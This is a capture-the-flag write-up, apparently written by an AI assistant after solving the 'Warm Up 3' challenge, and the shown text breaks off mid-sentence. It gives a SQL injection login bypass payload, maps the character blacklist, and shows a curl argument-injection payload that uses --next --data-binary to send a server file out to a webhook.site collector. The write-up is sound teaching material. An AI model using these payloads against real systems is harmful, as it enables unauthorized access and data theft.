Confirmed live on this instance — flag: **`HNYX{3nD_0f_w4rM_uP_cH4LleNg3_G00dLucK_h4ck3rS!}`**.

Here's the Burp Suite–style writeup.

---

# Warm Up 3 — Writeup (Burp Suite)

**Target:** `http://<instance>.sslip.io:8001/login.php`
**Flag:** `HNYX{3nD_0f_w4rM_uP_cH4LleNg3_G00dLucK_h4ck3rS!}`

**Challenge hint:** *"You found the admin credential. The system records a `Network_Success_Log` and uses a character blacklist to sanitize input."*

That hint tells us three things up front: get in as **admin**, there's a file called **Network_Success_Log**, and there's a **blacklist** to bypass.

---

## Step 1 — Recon with the Proxy

Browse the site with Burp's browser (Proxy **Intercept off**, watch **HTTP history**). You get a simple login form posting to `login.php`:

```
POST /login.php HTTP/1.1
Host: <instance>
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin
```

Response just says *"Invalid credentials."* — classic login to test for SQL injection.

---

## Step 2 — SQL injection login bypass (Repeater)

Right-click the login request → **Send to Repeater**. Try a basic auth-bypass payload in `username`:

```
username=' OR 1=1-- -&password=x
```

→ Response is **`302 Found → index.php`**. We're logged in! But the dashboard says *"Welcome, johndoe — standard user"*. `OR 1=1` just grabbed the **first** row.

We need the **admin** row. Add a `LIMIT` to walk through users (great use of Burp **Intruder**, or just bump the offset in Repeater):

```
username=' OR 1=1 LIMIT 4,1-- -&password=x
```

→ Now the dashboard says **"Welcome, Administrator"** and a new **Network Tools** tab appears. 

> The login query is `SELECT * FROM user WHERE username='$u' AND password='$p'` — fully injectable.

---

## Step 3 — Find the injection in the admin tool

Open `network_tools.php`. It's a *"Check Website Status"* box. Submit a host and watch it in Repeater:

```
POST /network_tools.php
url=youtube.com
```
→ `Response Code: HTTP/1.1 301`

So the server runs something like `curl` on our input. Test command injection:

```
url=youtube.com; id
```
→ **`[!] Warning: Bad characters have been blocked!`**

That's the blacklist from the hint. Send a few characters through Repeater/Intruder to map it:

| Blocked | Allowed |
|---|---|
| `; | & $ \` ( ) < > { } * ? ~ ^ # \` newline | **space**, **tab**, `- / . : , = + % @` quotes |

Shell separators are gone — **but spaces and dashes are allowed**. The input is dropped straight into a `curl` command, so we have **curl argument injection**.

---

## Step 4 — Read the flag file

The hint named the file: **`Network_Success_Log`**. The vulnerable command is roughly:

```
curl -s -D - -o /dev/null <our input> | grep -oP '^HTTP.+[0-9]{3}'
```

It only prints the HTTP status line, so injecting a second request that *prints a file* won't show in the page (blind). The trick is curl's **`--next`**, which starts a fresh request with its own options — letting us add `--data-binary @<file>` to **upload the file's contents to a server we control** (set up a free collector at webhook.site, the Burp equivalent of Collaborator):

```
POST /network_tools.php
url=http://x --next --data-binary @/var/www/html/Network_Success_Log https://webhook.site/<your-id>
```

Check the collector — the request body is the flag:

```
HNYX{3nD_0f_w4rM_uP_cH4LleNg3_G00dLucK_h4ck3rS!}
```

> Same trick reads any file, e.g. `--data-binary @/var/www/html/Dockerfile`, which shows the line `RUN echo "HNYX{...}" > /var/www/html/Network_Success_Log` — confirming where the flag came from.

---

## Shortcut

Because `Network_Success_Log` is written into the web root, it's also served as a static file — once you know the name from the hint, you can just GET it (no auth needed):

```
GET /Network_Success_Log HTTP/1.1
→ 200 OK
HNYX{3nD_0f_w4rM_uP_cH4LleNg3_G00dLucK_h4ck3rS!}
```

---

## TL;DR
1. **SQLi** `' OR 1=1 LIMIT 4,1-- -` in `username` → log in as **Administrator**.
2. Admin **Network Tools** runs `curl` on your input wit
... [288 chars omitted]
